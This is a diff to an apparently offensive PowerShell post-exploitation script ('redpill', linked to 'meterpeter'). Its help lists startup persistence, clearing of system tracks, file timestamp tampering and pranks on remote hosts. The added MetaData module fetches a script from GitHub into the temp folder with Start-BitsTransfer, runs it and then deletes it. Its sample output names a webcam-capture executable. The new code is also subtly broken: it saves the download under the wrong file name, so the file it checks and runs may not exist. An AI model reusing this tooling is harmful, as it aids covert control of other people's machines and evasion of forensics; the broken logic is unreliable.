@@ -80,7 +80,9 @@
    [string]$StreamData="false", [int]$Rate='1', [int]$TimeOut='5',
    [int]$BeaconTime='10', [int]$Interval='10', [int]$NewEst='10',
    [int]$Volume='88', [int]$Screenshot='0', [int]$Timmer='10',
-   [int]$SPort='8080', [int]$ButtonType='0'
+   [string]$Extension="false", [string]$FilePath="false",
+   [int]$SPort='8080', [int]$ButtonType='0',
+   [string]$MetaData="false"
 )
 
 
@@ -152,6 +154,7 @@ $ListParameters = @"
   -Persiste         `$Env:TMP\script.ps1  Persiste script.ps1 on every startup {BeaconHome}
   -CleanTracks      Clear|Paranoid       Clean disk artifacts left behind {clean system tracks}
   -FileMace         `$Env:TMP\test.txt    Change File Mace {CreationTime,LastAccessTime,LastWriteTime}
+  -MetaData         `$Env:TMP\test.exe    Display files \ applications description (metadata)
   -MsgBox           "Hello World."       Spawns "Hello World." msgBox on local host {wscriptComObject} 
   -SpeakPrank       "Hello World."       Make remote host speak user input sentence {prank}
   -PingSweep        Enum|Verbose         Enumerate active IP Addr (and ports) of Local Lan
@@ -1476,6 +1479,66 @@ If($FileMace -ne "false"){
    If(Test-Path -Path "$Env:TMP\FileMace.ps1"){Remove-Item -Path "$Env:TMP\FileMace.ps1" -Force}
 }
 
+If($MetaData -ne "false"){
+
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - Display file \ appl description (metadata)
+
+   .NOTES
+      -Extension [ exe ] parameter its used to recursive search starting in -FilePath
+      directory for standalone executables (exe) and display is property descriptions.
+
+   .EXAMPLE
+      PS C:\> .\MetaData.ps1 -MetaData "$Env:USERPROFILE\Desktop\CommandCam.exe"
+      Display CommandCam.exe stand alone executable file description (metadata)
+
+   .EXAMPLE
+      PS C:\> .\MetaData.ps1 -MetaData "$Env:USERPROFILE\Desktop" -Extension ".exe"
+      Search for .exe files recursive and display is property description
+
+   .OUTPUTS
+      FileMetadata
+      ------------
+      VersionInfo : File:             C:\Users\pedro\Desktop\CommandCam.exe
+                    InternalName:     CommandCam.exe
+                    OriginalFilename: CommandCam.exe
+                    FileVersion:      0.0.2.8
+                    FileDescription:  meterpeter WebCamSnap
+                    Product:          meterpeter WebCamSnap
+                    ProductVersion:   1.0.2.8
+                    Debug:            False
+                    Patched:          False
+                    PreRelease:       False
+                    PrivateBuild:     True
+                    SpecialBuild:     False
+                    Language:         Idioma neutro
+   #>
+
+   ## Download MetaData.ps1 from my GitHub
+   If(-not(Test-Path -Path "$Env:TMP\MetaData.ps1")){## Download MetaData.ps1 from my GitHub repository
+      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/MetaData.ps1 -Destination $Env:TMP\FileMace.ps1 -ErrorAction SilentlyContinue|Out-Null
+      ## Check downloaded file integrity => FileSizeKBytes
+      $SizeDump = ((Get-Item -Path "$Env:TMP\MetaData.ps1" -EA SilentlyContinue).length/1KB)
+      If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,6552734375/KB
+         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
+         If(Test-Path -Path "$Env:TMP\MetaData.ps1"){Remove-Item -Path "$Env:TMP\MetaData.ps1" -Force}
+         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
+      }   
+   }
+
+   ## run the auxiliary mdule
+   If(-not($Extension -ne "false")){
+       powershell -File "$Env:TMP\MetaData.ps1" -MetaData "$MetaData"
+   }Else{
+       powershell -File "$Env:TMP\MetaData.ps1" -MetaData "$MetaData"  -Extension "$Extension"  
+   }
+
+   ## Clean Old files left behind
+   If(Test-Path -Path "$Env:TMP\MetaData.ps1"){Remove-Item -Path "$Env:TMP\MetaData.ps1" -Force}
+}
+
 If($NetTrace -ieq "Enum"){
 
    <#
@@ -2519,6 +2582,46 @@ $HelpParameters = @"
       FullName                        Exists CreationTime       
       --------                        ------ ------------       
       C:\Users\pedro\Desktop\test.txt   True 08/03/1999 19:19:19
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "MetaData" -or $Help -ieq "Extension"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - Display file \ appl description (metadata)
+
+   .NOTES
+      -Extension [ exe ] parameter its used to recursive search starting in -FilePath
+      directory for standalone executables (exe) and display is property descriptions.
+
+   .EXAMPLE
+      PS C:\> .\MetaData.ps1 -MetaData "`$Env:USERPROFILE\Desktop\CommandCam.exe"
+      Display CommandCam.exe stand alone executable file description (metadata)
+
+   .EXAMPLE
+      PS C:\> .\MetaData.ps1 -MetaData "`$Env:USERPROFILE\Desktop" -Extension ".exe"
+      Search for .exe files recursive and display is property description
+
+   .OUTPUTS
+      FileMetadata
+      ------------
+      VersionInfo : File:             C:\Users\pedro\Desktop\CommandCam.exe
+                    InternalName:     CommandCam.exe
+                    OriginalFilename: CommandCam.exe
+                    FileVersion:      0.0.2.8
+                    FileDescription:  meterpeter WebCamSnap
+                    Product:          meterpeter WebCamSnap
+                    ProductVersion:   1.0.2.8
+                    Debug:            False
+                    Patched:          False
+                    PreRelease:       False
+                    PrivateBuild:     True
+                    SpecialBuild:     False
+                    Language:         Idioma neutro
    #>!bye..
 
 "@;
